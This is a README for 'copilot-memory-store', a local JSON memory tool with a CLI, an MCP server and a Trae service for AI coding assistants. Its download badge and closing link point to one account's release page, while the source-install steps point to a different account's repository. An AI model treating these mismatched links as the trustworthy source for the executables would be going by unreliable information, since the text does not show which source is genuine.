# 🛠️ copilot-memory-store - Simple Way to Manage Context Easily

[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Tokio17/copilot-memory-store/releases)

## 📚 Language Versions

- [English](README.md) - This document
- [中文](README-zh.md) - 中文版本

## 🚀 Getting Started

Welcome to the copilot-memory-store! This application helps you manage context while using AI tools like GitHub Copilot. It provides a simple memory store using local JSON files. You can interact with this store through a Command Line Interface (CLI) or an MCP server, and there’s also a custom agent for Visual Studio Code.

## 📦 Download & Install

### Method 1: Download from Releases Page

To get started, **visit this page to download** the latest version of the software: [Download copilot-memory-store](https://github.com/aspnmy/copilot-memory-store/releases). 

#### Installation Steps

1. Click the link above to open the releases page.
2. Find the latest version listed.
3. Download the appropriate file for your operating system.
4. If you're using Windows, you may download an `.exe` file. For macOS, look for `.dmg`. Linux users can find a `.tar.gz` file.

### Method 2: Install from Source

If you want to install from source code including the trae MCP service, follow these steps:

#### Installation Steps

1. **Clone the repository:**
   ```bash
   git clone https://github.com/aspnmy/copilot-memory-store.git
   cd copilot-memory-store
   ```

2. **Install dependencies:**
   ```bash
   npm install
   ```

3. **Build the project:**
   ```bash
   npm run build
   ```

4. **Create batch files (Windows):**
   ```bash
   npm run create:bat
   npm run create:bat:trae
   ```

5. **Run trae MCP service:**
   ```bash
   npm run trae
   ```

### Install NASM Assembler (for gcc compilation)

If you plan to compile the project to exe files using gcc, you need to install NASM assembler:

1. Download NASM 2.16.03 from [NASM official website](https://www.nasm.us/)
2. Install NASM and add it to the system PATH environment variable
3. Ensure gcc compiler is also installed and added to PATH

### Compile to exe files (using gcc)

```bash
# Compile all components (including trae MCP service)
npm run pkg:all:gcc
```

## 📋 System Requirements

Before you install copilot-memory-store, ensure your system meets the following requirements:

- **Operating System:**
  - Windows 10 or later
  - macOS 10.13 or later
  - Linux (Debian-based)
- **Memory:**
  - Minimum 4GB RAM
- **Disk Space:**
  - At least 100MB of free space

## 🛠️ Features

- **Local JSON Storage:** Keep data organized and local.
- **Command Line Interface (CLI):** A straightforward way to interact with the memory store.
- **MCP Server:** Set up a server for more advanced features.
- **Trae MCP Server:** Dedicated MCP service for Trae, supporting Trae-specific memory management and context compression.
- **VS Code Integration:** Use our custom agent for easy context management while coding.

## ⚙️ How to Use

Once you have installed the copilot-memory-store, follow these steps to begin using it:

1. **Open CLI:** On Windows, press `Win + R`, type `cmd`, and press Enter. On macOS, open "Terminal". Linux users can open their terminal app.
  
2. **Start the Server:** 
   - **Standard MCP Server:** Type `copilot-memory-mcp` and press Enter.
   - **Trae MCP Server:** Type `copilot-memory-trae` and press Enter.
   - The server will start, and you will see a message indicating it's running.

3. **Using the CLI:**
   - Type `copilot-memory-store help` to see available commands.
   - Use `add` to store new entries, `get` to retrieve them, and `delete` to remove any unwanted entries.

4. **Accessing the MCP Server:**
   - Open your web browser and go to `http://localhost:YOUR_PORT` (replace YOUR_PORT with the port number displayed when you started the server).

5. **Using the VS Code Agent:**
   - Install the agent from the same releases page.
   - Follow the installation prompts in Visual Studio Code.

6. **Using the Trae MCP Service:**
   - **Development Mode:** Run `npm run trae`
   - **Build Mode:** Run `npm run trae:dist`
   - **Batch File:** Use `bin/copilot-memory-trae.bat`
   
   **Trae-specific Tools:**
   - `trae_write`: Add a memory with Trae-specific metadata
   - `trae_search`: Search memories with Trae-specific filters
   - `trae_compress`: Compress context for Trae tasks
   - `trae_inject_context`: Auto-inject context for Trae tasks
   
   **Trae-specific Resources:**
   - `trae://stats`: Statistics about Trae-specific memories
   - `trae://recent`: Recent Trae memories

## 📖 Documentation

For detailed documentation about commands and features, check the [Wiki](https://github.com/Tokio17/copilot-memory-store/wiki). This resource includes examples and advanced tips to enhance your experience.

## 🤝 Community & Support

Join our community to ask questions, share insights, and learn more about context engineering. You can reach out through the following channels:

- **GitHub Issues:** Report any problems or ask for help.
- **Discussion Board:** Share ideas and get feedback from other users.

## 🔄 Contributing

If you're interested in improving copilot-memory-store, please consider contributing! Here are some ways you can help:

- Report issues you find.
- Suggest features you would like to see.
- Contribute code, documentation, or translations. 

## 🌟 Acknowledgments

We thank everyone who makes copilot-memory-store possible. Your support and feedback are invaluable. Together, we can innovate and improve tools for context engineering.

---

Now, go ahead and **visit this page to download** copilot-memory-store: [Download copilot-memory-store](https://github.com/Tokio17/copilot-memory-store/releases). Enjoy managing your AI context easily!